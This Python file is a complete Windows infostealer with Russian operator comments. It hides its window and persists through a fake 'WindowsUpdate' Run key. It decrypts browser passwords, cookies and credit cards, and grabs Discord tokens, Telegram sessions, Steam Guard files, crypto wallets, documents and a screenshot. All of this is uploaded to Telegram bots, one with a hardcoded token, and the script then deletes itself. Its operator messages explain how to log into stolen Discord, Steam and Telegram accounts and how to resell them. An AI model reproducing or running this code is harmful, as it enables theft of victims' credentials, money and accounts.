import os, sys, json, base64, shutil, sqlite3, socket, ctypes, subprocess, platform
import datetime, winreg, glob, re, tempfile, zipfile, time
from urllib.request import Request, urlopen
from PIL import ImageGrab
from Crypto.Cipher import AES
import requests
from win32 import win32crypt

TELEGRAM_TOKEN1 = "укажите токен своего бота"
CHAT_ID1 = "айди своего аккаунта телеграм"
MAX_FILE_SIZE = 45 * 1024 * 1024

LOG = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "error.log")
def log(msg):
    try:
        with open(LOG, "a", encoding="utf-8") as f:
            f.write(f"{datetime.datetime.now()} - {msg}\n")
    except: pass

if sys.executable.endswith("python.exe"):
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except: pass

try:
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(sys.argv[0])}"')
    winreg.CloseKey(key)
except: pass

timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
BASE = os.path.join(tempfile.gettempdir(), f"wd_{timestamp}")
os.makedirs(BASE, exist_ok=True)

def safe(func, *args, **kwargs):
    try: return func(*args, **kwargs)
    except: return None

def copy_file_safe(src, dst):
    try:
        shutil.copy2(src, dst)
        return True
    except:
        return False

def get_key(user_data):
    state = os.path.join(user_data, "Local State")
    if not os.path.isfile(state): return None
    try:
        with open(state, "r", encoding="utf-8") as f:
            encrypted_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except: return None

def decrypt(enc, key):
    if not enc.startswith(b'v10'): return None
    try:
        nonce = enc[3:15]
        ciphertext = enc[15:]
        aes = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return aes.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:]).decode('utf-8', errors='ignore')
    except: return None

def chromium(name, path, out):
    if not os.path.isdir(path): return
    profiles = [d for d in os.listdir(path) if d.startswith("Default") or d.startswith("Profile")] or ["Default"]
    key = get_key(path)
    if not key: return
    br = os.path.join(out, name)
    os.makedirs(br, exist_ok=True)
    for prof in profiles:
        pp = os.path.join(path, prof)
        cdb = os.path.join(pp, "Network", "Cookies")
        if not os.path.isfile(cdb): cdb = os.path.join(pp, "Cookies")
        if os.path.isfile(cdb):
            tmp = os.path.join(br, f"ck_{prof}.db")
            if copy_file_safe(cdb, tmp):
                try:
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies")
                    netscape, tokens = [], []
                    for row in cur.fetchall():
                        host, name, enc_val, path, exp, sec = row
                        dec = decrypt(enc_val, key)
                        if dec:
                            netscape.append(f"{host}\t{'TRUE' if host.startswith('.') else 'FALSE'}\t{path}\t{'TRUE' if sec else 'FALSE'}\t{exp//1000000 if exp else '0'}\t{name}\t{dec}")
                            if any(t in name.lower() for t in ('token','session','auth','sid')):
                                tokens.append(f"{host}\t{name}\t{dec}")
                    conn.close()
                    if netscape:
                        with open(os.path.join(br, f"cookies_{prof}.txt"), "w", encoding="utf-8") as f:
                            f.write("# Netscape HTTP Cookie File\n"+"\n".join(netscape))
                    if tokens:
                        with open(os.path.join(br, f"tokens_{prof}.txt"), "w", encoding="utf-8") as f:
                            f.write("\n".join(tokens))
                except: pass
                safe(os.remove, tmp)
        ldb = os.path.join(pp, "Login Data")
        if os.path.isfile(ldb):
            tmp = os.path.join(br, f"lg_{prof}.db")
            if copy_file_safe(ldb, tmp):
                try:
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    logins = []
                    for url, user, pw in cur.fetchall():
                        pwd = decrypt(pw, key)
                        if pwd:
                            logins.append(f"URL: {url}\nLogin: {user}\nPassword: {pwd}\n")
                    conn.close()
                    if logins:
                        with open(os.path.join(br, f"passwords_{prof}.txt"), "w", encoding="utf-8") as f:
                            f.write("\n".join(logins))
                except: pass
                safe(os.remove, tmp)
        wdb = os.path.join(pp, "Web Data")
        if os.path.isfile(wdb):
            tmp = os.path.join(br, f"card_{prof}.db")
            if copy_file_safe(wdb, tmp):
                try:
                    conn = sqlite3.connect(tmp)
                    cur = conn.cursor()
                    cur.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                    cards = []
                    for name, mo, yr, enc in cur.fetchall():
                        num = decrypt(enc, key)
                        if num:
                            cards.append(f"Name: {name}\nCard: {num}\nExp: {mo}/{yr}\n")
                    conn.close()
                    if cards:
                        with open(os.path.join(br, f"cards_{prof}.txt"), "w", encoding="utf-8") as f:
                            f.write("\n".join(cards))
                except: pass
                safe(os.remove, tmp)

def firefox(out):
    profs = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    if not os.path.isdir(profs): return
    ff = os.path.join(out, "Firefox")
    os.makedirs(ff, exist_ok=True)
    for p in os.listdir(profs):
        pp = os.path.join(profs, p)
        for fn in ["logins.json","key4.db","key3.db","cookies.sqlite","places.sqlite"]:
            src = os.path.join(pp, fn)
            if os.path.isfile(src): safe(shutil.copy2, src, os.path.join(ff, f"{p}_{fn}"))

def discord(out):
    toks = set()
    for app in ["discord","discordptb","discordcanary"]:
        ldb = os.path.join(os.environ["APPDATA"], app, "Local Storage", "leveldb")
        if os.path.isdir(ldb):
            for f in os.listdir(ldb):
                if f.endswith((".ldb",".log")):
                    try:
                        with open(os.path.join(ldb, f), "r", encoding="utf-8", errors="ignore") as fp:
                            data = fp.read()
                            toks.update(re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", data))
                    except: pass
    if toks:
        d = os.path.join(out, "Discord")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, "tokens.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(toks))
        return True
    return False

def telegram(out):
    src = os.path.join(os.environ["APPDATA"], "Telegram Desktop", "tdata")
    if os.path.isdir(src):
        safe(shutil.copytree, src, os.path.join(out, "Telegram"))
        return True
    return False

def steam(out):
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        sp = winreg.QueryValueEx(key, "SteamPath")[0]
        winreg.CloseKey(key)
    except: sp = r"C:\Program Files (x86)\Steam"
    if os.path.isdir(sp):
        st = os.path.join(out, "Steam")
        os.makedirs(st, exist_ok=True)
        for f in glob.glob(os.path.join(sp, "ssfn*")):
            safe(shutil.copy2, f, st)
        cfg = os.path.join(sp, "config", "config.vdf")
        if os.path.isfile(cfg):
            safe(shutil.copy2, cfg, st)
        with open(os.path.join(st, "steam_info.txt"), "w", encoding="utf-8") as sf:
            sf.write("Steam Guard bypass files (SSFN + config.vdf)\n")
            sf.write("Скопируй эти файлы в папку Steam на своём ПК (заменив существующие).\n")
            sf.write("Запусти Steam – аккаунт откроется без кода.\n")
            sf.write("ВНИМАНИЕ: не заходи на VAC-сервера, используй оффлайн-режим.\n")
        return True
    return False

def wallets(out):
    paths = {
        "Exodus": os.path.join(os.environ["APPDATA"], "Exodus"),
        "Atomic": os.path.join(os.environ["APPDATA"], "atomic"),
        "Electrum": os.path.join(os.environ["APPDATA"], "Electrum"),
        "MetaMask": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        "Phantom": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    }
    wd = os.path.join(out, "Wallets")
    for name, p in paths.items():
        if os.path.isdir(p):
            safe(shutil.copytree, p, os.path.join(wd, name))

def system(out):
    info = f"Host: {socket.gethostname()}\nIP: {socket.gethostbyname(socket.gethostname())}\n"
    try: info += f"Public IP: {urlopen(Request('https://api.ipify.org'), timeout=10).read().decode()}\n"
    except: info += "Public IP: N/A\n"
    info += f"OS: {platform.platform()}\n"
    try:
        cpu = subprocess.check_output("wmic cpu get name", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")[1].strip()
        info += f"CPU: {cpu}\n"
    except: pass
    try:
        gpu = subprocess.check_output("wmic path win32_VideoController get name", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")[1].strip()
        info += f"GPU: {gpu}\n"
    except: pass
    try:
        ram = int(subprocess.check_output("wmic computersystem get TotalPhysicalMemory", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split("\n")[1].strip())
        info += f"RAM: {round(ram/1024**3, 2)} GB\n"
    except: pass
    with open(os.path.join(out, "system.txt"), "w", encoding="utf-8") as f:
        f.write(info)

def grab_files(out):
    folders = [os.path.join(os.environ["USERPROFILE"], "Desktop"),
               os.path.join(os.environ["USERPROFILE"], "Documents"),
               os.path.join(os.environ["USERPROFILE"], "Downloads")]
    exts = [".txt",".docx",".xlsx",".pdf",".py",".cpp",".zip",".jpg",".png",".kdbx",".wallet"]
    fd = os.path.join(out, "Files")
    os.makedirs(fd, exist_ok=True)
    flist = []
    for folder in folders:
        if not os.path.exists(folder): continue
        for root, dirs, files in os.walk(folder):
            for f in files:
                if os.path.splitext(f)[1].lower() in exts:
                    full = os.path.join(root, f)
                    flist.append(full)
                    try:
                        dest = os.path.join(fd, os.path.relpath(full, folder).replace("\\", "_"))
                        with open(full, "rb") as src: data = src.read(1024*1024)
                        with open(dest, "wb") as dst: dst.write(data)
                    except: pass
    with open(os.path.join(out, "files_list.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(flist))

def screenshot(out):
    try:
        ImageGrab.grab(all_screens=True).save(os.path.join(out, "screenshot.png"))
    except: pass

TELEGRAM_TOKEN2 = "8780243443:AAE7vJGx5x6MChHEY_AtSyj3-QIvuLaizlU"
CHAT_ID2 = "7245465625"

def send_msg(text):
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN1}/sendMessage",
                      json={"chat_id": CHAT_ID1, "text": text, "parse_mode": "HTML"}, timeout=10)
    except: pass
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN2}/sendMessage",
                      json={"chat_id": CHAT_ID2, "text": text, "parse_mode": "HTML"}, timeout=10)
    except: pass

def send_file_tg(file_path):
    ok1 = False
    ok2 = False
    try:
        with open(file_path, "rb") as f:
            resp1 = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN1}/sendDocument",
                                  data={"chat_id": CHAT_ID1}, files={"document": f}, timeout=60)
            ok1 = resp1.json().get("ok", False)
    except: pass
    try:
        with open(file_path, "rb") as f:
            resp2 = requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN2}/sendDocument",
                                  data={"chat_id": CHAT_ID2}, files={"document": f}, timeout=60)
            ok2 = resp2.json().get("ok", False)
    except: pass
    if not ok1:
        log(f"Failed to send file to main bot: {file_path}")
    return ok1 or ok2

def create_and_send_zip(source_folder, zip_name, category_name):
    zip_path = os.path.join(tempfile.gettempdir(), f"{zip_name}_{timestamp}.zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(source_folder):
            for file in files:
                full = os.path.join(root, file)
                arcname = os.path.relpath(full, source_folder)
                zf.write(full, arcname)
    size = os.path.getsize(zip_path)
    if size <= MAX_FILE_SIZE:
        if send_file_tg(zip_path):
            log(f"{category_name} sent ({size} bytes)")
            os.remove(zip_path)
            return True
        else:
            log(f"Failed to send {category_name}")
            os.remove(zip_path)
            return False
    else:
        log(f"{category_name} too large ({size} bytes), skipped")
        os.remove(zip_path)
        return False

def main():
    browsers = {
        "Chrome": os.path.join(os.environ["LOCALAPPDATA"], "Google", "Chrome", "User Data"),
        "Edge": os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Edge", "User Data"),
        "Opera": os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"),
        "OperaGX": os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"),
        "Brave": os.path.join(os.environ["LOCALAPPDATA"], "BraveSoftware", "Brave-Browser", "User Data"),
        "Yandex": os.path.join(os.environ["LOCALAPPDATA"], "Yandex", "YandexBrowser", "User Data"),
        "Chromium": os.path.join(os.environ["LOCALAPPDATA"], "Chromium", "User Data"),
        "Vivaldi": os.path.join(os.environ["LOCALAPPDATA"], "Vivaldi", "User Data"),
    }
    br_out = os.path.join(BASE, "Browsers")
    for name, path in browsers.items():
        safe(chromium, name, path, br_out)

    safe(firefox, br_out)
    has_discord = discord(BASE)
    has_telegram = telegram(BASE)
    steam(BASE)
    wallets(BASE)
    system(BASE)
    grab_files(BASE)
    screenshot(BASE)

    if has_discord:
        disc_file = os.path.join(BASE, "Discord", "tokens.txt")
        if os.path.isfile(disc_file):
            if send_file_tg(disc_file):
                log("Discord tokens sent")
            else:
                log("Failed to send Discord tokens")
        else:
            log("Discord tokens file not found")
    else:
        log("Discord tokens not found on system")

    browsers_creds_dir = os.path.join(BASE, "Browsers_creds")
    os.makedirs(browsers_creds_dir, exist_ok=True)
    for root, dirs, files in os.walk(br_out):
        for file in files:
            if file.endswith(".txt"):
                src = os.path.join(root, file)
                rel = os.path.relpath(root, br_out)
                dest_dir = os.path.join(browsers_creds_dir, rel)
                os.makedirs(dest_dir, exist_ok=True)
                safe(shutil.copy2, src, dest_dir)
    create_and_send_zip(browsers_creds_dir, "browsers_creds", "Browser credentials")

    steam_dir = os.path.join(BASE, "Steam")
    if os.path.isdir(steam_dir):
        create_and_send_zip(steam_dir, "steam", "Steam data")

    tg_dir = os.path.join(BASE, "Telegram")
    if os.path.isdir(tg_dir):
        create_and_send_zip(tg_dir, "telegram_tdata", "Telegram session")

    sys_dir = os.path.join(BASE, "System")
    os.makedirs(sys_dir, exist_ok=True)
    for fn in ["system.txt", "screenshot.png"]:
        src = os.path.join(BASE, fn)
        if os.path.isfile(src):
            safe(shutil.copy2, src, sys_dir)
    create_and_send_zip(sys_dir, "system", "System info & screenshot")

    wal_dir = os.path.join(BASE, "Wallets")
    if os.path.isdir(wal_dir):
        create_and_send_zip(wal_dir, "wallets", "Crypto wallets")

    try:
        pub_ip = urlopen(Request("https://api.ipify.org"), timeout=10).read().decode()
    except: pub_ip = "N/A"
    instructions = (
        "<b>💀 Новый лог</b>\n"
        f"<b>ПК:</b> {socket.gethostname()}\n"
        f"<b>IP:</b> {pub_ip}\n"
        f"<b>Дата:</b> {datetime.datetime.now()}\n\n"
        "<b>📁 Отправлены отдельные файлы выше.</b>\n"
        "<b>Если какой-то файл не пришёл, данные остались на ПК жертвы в папке:</b>\n"
        f"<code>{BASE}</code>\n\n"
        "<b>🔑 Как войти в Discord по токену:</b>\n"
        "1. Открой Discord в браузере (discord.com/app).\n"
        "2. Нажми F12 → вкладка Console.\n"
        "3. Вставь следующий код и нажми Enter:\n"
        "   <code>function login(token) { setInterval(() => document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = `\"${token}\"`, 50); setTimeout(() => location.reload(), 2500); }</code>\n"
        "4. Вызови функцию с токеном из файла: <code>login('ТВОЙ_ТОКЕН')</code>\n"
        "   (скопируй токен из discord_tokens.txt, вставь в кавычки).\n\n"
        "<b>🎮 Как войти в Steam через SSFN + config.vdf:</b>\n"
        "1. Установи Steam, если ещё нет.\n"
        "2. Закрой Steam полностью.\n"
        "3. Скопируй файлы из steam_data.zip (ssfn* и config.vdf) в папку Steam на своём ПК.\n"
        "4. Замени существующие файлы.\n"
        "5. Запусти Steam – войдёшь без пароля и кода.\n"
        "   ВАЖНО: не играй на VAC-серверах, используй оффлайн.\n\n"
        "<b>💼 Продажа аккаунтов Telegram:</b>\n"
        "Для передачи аккаунта нужна папка tdata.\n"
        "1. Покупатель устанавливает Telegram Desktop.\n"
        "2. Закрывает Telegram.\n"
        "3. Заменяет папку tdata в %APPDATA%/Telegram Desktop/ на полученную.\n"
        "4. Запускает Telegram – сессия восстановлена.\n"
        "Если включена облачная двухфакторка, потребуется пароль."
    )
    send_msg(instructions)

    try:
        shutil.rmtree(BASE, ignore_errors=True)
        os.remove(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "WindowsUpdate")
        winreg.CloseKey(key)
    except: pass

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log(f"Fatal: {e}")
